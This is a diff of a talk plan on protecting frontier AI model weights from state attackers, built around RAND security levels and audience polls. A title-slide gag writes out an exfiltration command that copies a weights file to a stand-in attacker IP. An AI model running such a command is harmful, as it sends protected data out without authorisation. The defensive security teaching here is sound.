@@ -1,6 +1,6 @@
 # PLAN: Stealing Superintelligence
 
-Mirror of the Notion plan, **draft v7.5 (Nov 15 2026)**: https://app.notion.com/p/41158933bf32810aaf6dc2cc614e2954
+Mirror of the Notion plan, **draft v7.7 (Nov 19 2026)**: https://app.notion.com/p/41158933bf32810aaf6dc2cc614e2954
 Notion is the source of truth; this file is re-synced when Nitzan says "plan updated".
 **On screen** = what the audience sees. **Say** = speaker notes (never on screen). **Notes** = facts, branches, build hints.
 
@@ -34,14 +34,14 @@ Anchors: SL5 is complex · Reactive isn't enough · Starting early is what works
 | 6 Call to arms | 14:35–16:50 | S18, S20–S21 | Bridge, links, thank you (S19 cut Nov 14) |
 
 Per-slide times below are from before S8 was cut.
-Length ≈18:00 with everything (v7 +≈10s). **15-min cut**: dropping S9 (S19 is now cut for good) and trimming S16 now gets to only ≈16:20. To reach 15:00, also drop S16 entirely and S11 (the LGTM gag). S1c stays in the cut. (v6, Nov 13: v6 added ≈60s; slide times below not shifted. Nitzan: handle the cut after finalization.)
+**Slot (Nov 15): assume 20 min unless told otherwise → the full version is the default; the 15-min cut stays as a fallback toggle.** Length ≈18:00 with everything (v7 +≈10s). **15-min cut**: dropping S9 (S19 is now cut for good) and trimming S16 now gets to only ≈16:20. To reach 15:00, also drop S16 entirely and S11 (the LGTM gag). S1c stays in the cut. (v6, Nov 13: v6 added ≈60s; slide times below not shifted. Nitzan: handle the cut after finalization.)
 
 ---
 
 ## Part 0: Pre-show
 
 ### S0 · before start · 📱 POLL (warm-up)
-- **On screen:** the title slide itself, up during changeover / MC intro: title, subtitle, speaker's name. In the corner, a QR with the call to action **"Scan → pick a side"** and a live counter ("143 in the room"). The question appears only on phones: "Which side are you on?" A dimmed datacenter loop (#01) behind; under the title, `$ scp weights.bin` types itself out.
+- **On screen:** the title slide itself, up during changeover / MC intro: title, subtitle, speaker's name. In the corner, a QR with the call to action **"Scan → pick a side"** and a live counter ("143 in the room"). The question appears only on phones: "Which side are you on?" A dimmed datacenter loop (#01) behind; under the title, `$ scp weights.bin root@203.0.113.7:~/totally_not_weights/` types itself out (Nov 19: a complete command; 203.0.113.x is a reserved documentation IP, nobody's real server).
 - **Poll `warm`:** Red team (I break in) · Blue team (I keep them out) · **Both, depends on the contract** · AI (research, safety, security) · None of the above (on phones only).
 - **Say:** nothing (the MC is talking). If a holding slide isn't allowed, use the first 20s of the talk: "Scan this now, you'll need it later. One question, five seconds."
 - **Notes:** one scan covers the whole talk; the phone auto-advances to each later poll. Needs organizer OK to put it up before the talk. "(on phones only)" = the question is shown on phones only; all 5 options get bars on S4 (Nitzan, Nov 7). "N in the room" = phones that answered the warm-up.
@@ -53,7 +53,7 @@ Length ≈18:00 with everything (v7 +≈10s). **15-min cut**: dropping S9 (S19 i
   - **Nvidia gag (click on "buy the chips"):** a kiss-cam frame built in code pops up top-right. Banner "♥ ~~KISS CAM~~ EXPORT CONTROL CAM ♥"; inside it the clip plays (muted, 6s, `kisscam-clip.mp4`); ticker "MEGASPEED · SINGAPORE · 240,000 GPUs (ALLEGED) · ✅ APPROVED"; corner credit "AI video: @dedene". Counters stay visible. (Nov 13, Nitzan: 6s was too fast → stays up until the next click, clip loops.)
   - Deck (Nov 13): built as click 4 on S1a (Nitzan's call after Claude flagged the risk of an AI-made intimate depiction of real people; he judged it widely seen and recognizable). Clip muted, "AI video: @dedene" credit always visible.
 - **Say:** "Put on your offensive hat for sixty seconds. Imagine your unit is given a target: a frontier AI lab in California. To build their latest AI model (what we call **pre-training**), that lab had to spend billions of dollars, build a massive power station, and run 100,000 export-controlled GPUs for six months straight. Your country doesn't have the billions, and because of sanctions, you aren't allowed to buy the chips."
-  - (On the click; pick one at rehearsal.) Gemini: "...Well, unless you meet the CEO of Nvidia at a bar in Taipei, in which case getting 100,000 export-controlled GPUs is surprisingly affordable." Claude: "…Well, unless your data-center executive has dinner with the CEO of Nvidia in Taipei. Then, allegedly, you get access to 240,000 of them."
+  - (On the click.) "…unless you have dinner with the CEO of Nvidia in Taipei. Then, allegedly, 240,000 of them become available." (Nov 15, option C: Gemini's rhythm with the facts fixed: a dinner, not a bar; 240,000, not 100,000; "allegedly". Ticker kept.)
 - **Notes:** on-screen GPU count matches the script. **Nvidia gag facts:** Jensen Huang resigned Nov 12, 2026, so on Nov 22 say "last week". Alice Huang, a Megaspeed (Singapore) executive, is suspected by US intelligence of spying for China but has not been charged. Megaspeed is under investigation in the US and Singapore for allegedly smuggling access to 240,000 restricted chips. The Taipei meeting was a restaurant dinner (May 2025), not a bar. The clip is an AI edit by Peter Dedene: label it, keep it muted. Re-check the news on Nov 21. Only Nvidia reference in the talk.
 
 ### S1b · 0:40 · 😄 (+ #02 microSD)
@@ -64,7 +64,7 @@ Length ≈18:00 with everything (v7 +≈10s). **15-min cut**: dropping S9 (S19 i
 - **Notes:** $160 = a 2TB SanDisk microSD. A 2TB file fills a 2TB card (hence "delete Call of Duty first").
 
 ### S1c · 1:15 · ⬛ "What's in the file?" (target package)
-- **On screen:** a paper "target package" slides in: TARGET Frontier AI lab, California · OBJECTIVE `model_weights.bin` (2.0 TB) · FITS ON One $160 microSD. Under "WHAT WE GET", three blacked-out lines.
+- **On screen:** a paper "target package" slides in, stamped **TOP SECRET** (Nov 19: replaces "EYES ONLY"), with a grainy surveillance photo of the datacenter (#01) paper-clipped to it: TARGET Frontier AI lab, California · OBJECTIVE `model_weights.bin` (2.0 TB) · FITS ON One $160 microSD. Under "WHAT WE GET", three blacked-out lines.
   - Clicks 1–3: each line is un-redacted: **1. Cyber offense** · **2. Bio & chem weapons uplift** · **3. A head start on the next model** (highlighted, + a PRIORITY stamp).
   - Footer: "Payoff list = risks tracked in the labs' own safety frameworks".
 - **Say:** "So what's actually in that file? Picture the target package your unit just got. [click] One: cyber offense. A model that helps your hackers. [click] Two: help with biological and chemical weapons. [click] And three, the one a superpower wants most: a head start on the next model. Steal this one, and it helps you build the one after it. And that's not my list. Those are the risks the labs' own safety frameworks track."
@@ -105,7 +105,7 @@ Length ≈18:00 with everything (v7 +≈10s). **15-min cut**: dropping S9 (S19 i
 - **On screen:** the question, big, in plain English: **"You need to steal the flagship model weights from a top-3 AI lab today. What is the minimum level of attacker needed to pull it off?"** Four options. "It's already on your phone" + a small QR + live counter. **No SL labels.**
 - **Poll `A`:** A $1M budget: a top-tier crime syndicate or one insider · A $10M budget: a standard state cyber operation · A $1B budget: a superpower's top-priority operation · Impossible, even for a superpower.
 - **Say (while voting, ≈60s):** "No jargon yet, just your gut… And no, the insiders in the room don't get to vote twice."
-- **Notes:** budgets = RAND tiers (OC3 $1M · OC4 $10M · OC5 $1B).
+- **Notes:** budgets = RAND tiers (OC3 $1M · OC4 $10M · OC5 $1B). No label above the question (Nov 19: "Your gut · no jargon yet" removed; the question itself is the heading).
 
 ### S6 · 5:05 · 📱 Poll A results
 - **On screen:** the bars animate in; the leading bar glows amber.
@@ -118,9 +118,10 @@ Length ≈18:00 with everything (v7 +≈10s). **15-min cut**: dropping S9 (S19 i
 ### S7 · 5:35 · ⬛ RAND ladder (animated build)
 - **Deck:** S6 + S7 are one view: the Poll A bars morph into the rungs ($1B → SL5, $10M → SL4, $1M → SL3, Impossible above SL5); the room's % stays on each rung (Nitzan, Nov 7).
 - **On screen:** the bars morph into a 5-rung ladder.
-  - Click 1: SL1→SL5 rungs, each with who it stops (people icons, budget, time).
-  - Click 2: a marker at SL3: "Frontier labs: roughly here, or below".
-  - Click 3: a quote under SL4: "Top cyber nations run these more than 100 times per year." (RAND)
+  - Click 1: SL1→SL5 rungs, each with who it stops and the **budget only** (ties back to Poll A's $1M / $10M / $1B).
+  - Click 2: the people and time columns appear (Nov 19).
+  - Click 3: a marker at SL3: "Frontier labs: roughly here, or below".
+  - Click 4: a quote under SL4: "Top cyber nations run these more than 100 times per year." (RAND)
   - Footer: RAND RR-A2849-1 (Nevo et al., 2024).
 - **Say:** "Without knowing it, you just recreated the exact framework that defines our field. Two years ago, researchers at RAND published the foundational report on **Securing AI Model Weights**. Instead of defining security by compliance checklists, they defined **5 Security Levels, SL1 through SL5**, based purely on who can break into your lab: SL1 & SL2 stop amateurs and professional hackers. SL3 stops cybercrime syndicates and insiders (≈$1M). **This is roughly where top frontier labs sit today, or below.** SL4 stops a standard operation by a state cyber unit (≈$10M), the kind top cyber nations run more than a hundred times a year. SL5 defends model weights against a **≈$1B, multi-year priority campaign by the world's top cyber superpower.**"
 - **Notes:** RAND: OC3 = crime/insider ≤$1M → SL3; OC4 = standard state op ≤$10M, ≈1 yr → SL4; OC5 ≤$1B, years → SL5.
@@ -150,22 +151,22 @@ Length ≈18:00 with everything (v7 +≈10s). **15-min cut**: dropping S9 (S19 i
 - **Say:** "In SL5 that means real two-person rules: two people physically authorize every sensitive action together. Not the startup version, where one engineer writes a 4,000-line pull request and another engineer types 'LGTM 👍' twelve seconds later from the bathroom."
 
 ### S12 · 9:35 · ⬛ credit cards
-- **On screen:** kicker "The building blocks" (Nitzan, Nov 14). Two cards: **"RAND · Securing AI Model Weights (2024): the attacker tiers"** and **"Security Level 5 · SL5 Standard (2026): the building blocks"**. Click: a third card fades in, **"Price? Schedule?"**
-- **Say:** "The good news: nobody has to start from zero. RAND and Security Level 5, a nonprofit that grew out of the SL5 Task Force, did the hard part, in the open. They coined the terminology, those attacker tiers, and laid out the building blocks of a defense. Nobody had done that before. What they don't do is put a price or a schedule on any of it. And the schedule turns out to be the whole story."
-- **Notes:** rewritten Nov 7 in Nitzan's blog wording. Credits RAND + Security Level 5 (sl5.org) and leads into Part 5 (time) without simulator numbers.
+- **On screen:** kicker "The building blocks" (Nitzan, Nov 14). Two cards: **"RAND · Securing AI Model Weights (2024): the attacker tiers"** and **"Security Level 5 · SL5 Standard (2026): the building blocks"**. Click 1 (Nov 19): one line appears under the two cards: **"You can't make an arbitrary system SL5. You can make a narrow, purpose-built AI data center SL5."** Click 2: a third card fades in, **"Price? Schedule?"**
+- **Say:** "The good news: nobody has to start from zero. RAND and Security Level 5, formerly the SL5 Task Force, did the hard part, in the open. They coined the terminology, those attacker tiers, and laid out the building blocks of a defense. Nobody had done that before. [click] Their bet: you can't make an arbitrary system SL5. You can make a narrow, purpose-built AI data center SL5. Pick the few properties that really matter, the fewest parts that protect them, and make those parts simple. [click] What they don't do is put a price or a schedule on any of it. And the schedule turns out to be the whole story."
+- **Notes:** Nov 19: the scoping line comes from a Security Level 5 reviewer: SL5 is impossible for an arbitrary system, but they believe it's possible for a well-scoped AI data center (a narrow set of critical properties, a small set of components that upholds them, then simplify those components). On screen: the first two sentences only; the rest is spoken. It also sets up S15: that new data center is what takes years. Rewritten Nov 7 in Nitzan's blog wording. Credits RAND + Security Level 5 (sl5.org) and leads into Part 5 (time) without simulator numbers.
 
 ## Part 5: When do you lock the doors?
 
 ### S13 · 10:20 · 📱 Polls B1 + B2 + C vote (chained on the phone)
 - **On screen:** "3 quick questions, on your phone now". The three question cards, each with its own live counter. QR in the corner.
-- **Poll `B1`:** "If you lock an AI lab inside that wall of SL5 controls today (strict air-gaps, no open internet, real two-person rules for every action), how much does it slow down AI research?" → Barely (<10%) · Painful (10–30%) · Very painful (30–50%) · Crippling (>50%, top researchers quit)
+- **Poll `B1`:** "If you lock an AI lab inside that wall of SL5 controls today (strict air-gaps, no open internet, real two-person rules for every action), how much does it slow down AI research?" → <10% · 10–30% · 30–50% · >50% (Nov 19: numbers only, on phones and slides; the reviewer finds 10% already very painful)
 - **Poll `B2`:** "Given that slowdown and the billions it costs, if you are a lab CEO racing competitors toward AGI, when do you actually lock down to SL5?" → Start right now · Wait until models start looking dangerous ("Just-in-Time") · Never, winning the race matters more
 - **Poll `C`:** "What is the probability that the raw weights of at least one frontier model have ALREADY been silently stolen by a foreign intelligence service?" → High (>70%) · Moderate (30–70%) · Low (<30%)
 - **Say (≈90s):** read each question once. "Be honest on the CEO one."
 - **Notes:** the phone chains B1 → B2 → C. Results are revealed after all three.
 
 ### S14 · 11:50 · 📱 B1 + B2 results
-- **On screen:** B1 results (big "heavy slowdown" share + bars). Click: B2 fades in beside it (big "Just-in-Time" share + bars), so one idea at a time and the contrast at the end (Nov 14).
+- **On screen:** B1 results (big share for ">30%", labeled by its range, no adjective + bars). Click: B2 fades in beside it (big "Just-in-Time" share + bars), so one idea at a time and the contrast at the end (Nov 14).
 - **Say:** "So X% of you think SL5 hurts research a lot. [click] And Y% would wait until the models look dangerous. That's the pragmatic answer. It's what I'd have said. It's also the answer that loses."
 - **Branches:**
   - "Start right now" wins: "Most of you would start now. Your future CFO disagrees. Let's see why you're right."
@@ -217,9 +218,9 @@ Length ≈18:00 with everything (v7 +≈10s). **15-min cut**: dropping S9 (S19 i
   3. Go deeper: the RAND report · the SL5 Standard
   4. Talk to me: LinkedIn / after the talk
 
-  Small strip: "Already working on this: RAND · Security Level 5 · Irregular · Heron · Palisade · FAR.AI · UK AI Security Institute" (text, no logos; US CAISI dropped Nov 14, also from the phone links page Nov 15).
+  Small strip: **"Working on SL5: RAND · Security Level 5"** (text, no logos; Nov 19 review: Irregular works on current security, Palisade on communications, FAR.AI and UK AISI on AI security research, none of it SL5 work). Phone links page: same list.
 - **Say:** "If any of this got under your skin, here's where to start. I would rather fix a number than defend it. Everything is open-sourced on GitHub. If you disagree with a number or an attack path, it's a one-file JSON change. The intro works on your phone; the simulator itself needs a computer."
-- **Notes:** phones still on the vote page switch to the links page automatically. Phone links page: intro (phone OK) · simulator (`nitzpo.github.io/sl5`, "open it on a computer: it's not built for phones") · GitHub · RAND · SL5 Standard · LinkedIn. Irregular is Israeli-founded; its CEO Dan Lahav co-wrote the RAND report.
+- **Notes:** phones still on the vote page switch to the links page automatically. Phone links page: intro (phone OK) · simulator (`nitzpo.github.io/sl5`, "open it on a computer: it's not built for phones") · GitHub · RAND · SL5 Standard · LinkedIn.
 
 ### S21 · 16:30 · 🎬 #07 vault
 - **On screen:** the weights.bin icon slides into a vault, the door closes, black. Then the name, the QR and "Thank you" stay up for Q&A. **No quote.**
@@ -243,9 +244,10 @@ Length ≈18:00 with everything (v7 +≈10s). **15-min cut**: dropping S9 (S19 i
 - Any laptop: the deck runs from a URL in Chrome; a clicker works as the arrow keys. Backup on a USB stick: a local HTML copy + a PDF (no live polls).
 - Fallback: if the network dies, each poll has a show-of-hands version. Never show fake numbers.
 - Anonymous, counts only. The export feeds the post-talk stats.
+- **Audience size (Nov 15):** probably tens, but be ready for 300. Keep the free tier and 5s polling while the screen is on (adjustable in admin).
 
 ## Image prompts (Nitzan generates in Nano Banana Pro / Veo)
-Style block prepended to every prompt: "Cinematic film still, 16:9, low-key lighting, teal-and-amber color grade, anamorphic lens, shallow depth of field, subtle film grain, photorealistic. No text, no logos, no recognizable faces." Deliver ≥1920×1080, named `01-datacenter` … `08-jet` (#3 and #4 are 1:1; the rest are 16:9).
+Style block prepended to every prompt: "Cinematic film still, 16:9, low-key lighting, teal-and-amber color grade, anamorphic lens, shallow depth of field, subtle film grain, photorealistic. No text, no logos, no recognizable faces." Deliver ≥1920×1080, named `01-datacenter` … `08-jet` (#3 and #4 are 1:1; the rest are 16:9). Nov 15: the current images look good as they are; no regeneration needed.
 
 | # | Used in | Brief | Loop |
 |---|---|---|---|
@@ -282,9 +284,9 @@ Style block prepended to every prompt: "Cinematic film still, 16:9, low-key ligh
 | OpenAI engineer (Saudi national) arrested ≈Oct 9, 2026 (charges unsealed Oct 13) for hiding a listening device in an exec conference-room TV. Prosecutors allege contact with a member of the Saudi royal family. OpenAI: no sign weights were accessed | ABC News https://abcnews.com/Politics/open-ai-employee-arrested-listening-device-communicated-saudi/story?id=137385420 · CNBC https://www.cnbc.com/2026/10/13/openai-employee-arrested-recording-device.html |
 | Anthropic: seven distillation campaigns by China-based labs in 2026; the largest (Alibaba-affiliated) ≈151M exchanges | The Hacker News, Sep 2026 https://thehackernews.com/2026/09/anthropic-says-seven-china-based-ai.html |
 | The SL5 Standard covers misaligned AI that may "sabotage research or exfiltrate themselves" as "a distinct form of insider threat", and lists model outputs as assets because they "could be used to distill" | SL5 Standard v0.1 (`research/sl5_standard.txt`) |
-| Security Level 5 is a 501(c)(3) nonprofit; CEO Lisa Thiergart | https://sl5.org |
+| Security Level 5 (formerly the SL5 Task Force) is a 501(c)(3) nonprofit; CEO Lisa Thiergart | https://sl5.org |
 | Jensen Huang resigned as Nvidia CEO on Nov 12, 2026 (Colette Kress interim). Alice Huang (Megaspeed, Singapore) is suspected by US intelligence of spying for China, not charged. Megaspeed is under investigation in the US and Singapore over 240,000 restricted chips. The Taipei photo is from a dinner, May 22, 2025 | CBS News https://www.cbsnews.com/news/nvidia-ceo-jensen-huang-resigns/ · Al Jazeera https://www.aljazeera.com/news/2026/11/12/why-did-nvidia-ceo-jensen-huang-resign-and-who-is-colette-kress |
 | Kiss-cam clip: an AI video by Peter Dedene (@dedene), circulated on X | Nitzan's upload |
 
 ## Decided
-17-min plan + 15-min cut (slot unknown) · deck runs on any laptop · no reliance on the workshop or Heron · naming torchtriton and Su Bin is OK · the simulator stays vague · keep the "depends on the contract" joke · hype words OK · title = Stealing Superintelligence: Protecting from superpowers, and against rogue AI (final, Nov 15).
+assume a 20-min slot, so the full ≈18-min version is the default, with the 15-min cut as a fallback toggle (Nov 15) · deck runs on any laptop · no reliance on the workshop or Heron · naming torchtriton and Su Bin is OK · the simulator stays vague · keep the "depends on the contract" joke · hype words OK · title = Stealing Superintelligence: Protecting from superpowers, and against rogue AI (final, Nov 15). · Nov 19 review, kept as is on purpose: kiss cam, 2.0 TB, other labels, S2, S3c, S10 cards.
